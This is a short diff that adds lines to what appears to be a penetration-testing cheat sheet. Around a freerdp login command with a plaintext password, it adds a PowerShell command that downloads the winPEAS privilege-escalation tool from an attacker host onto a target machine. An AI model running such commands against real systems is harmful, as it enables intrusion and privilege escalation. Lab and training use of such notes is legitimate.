@@ -16,3 +16,6 @@ $ stty rows <num> columns <cols>
 
 
 freerdp /u:admim /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
+
+download 
+iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
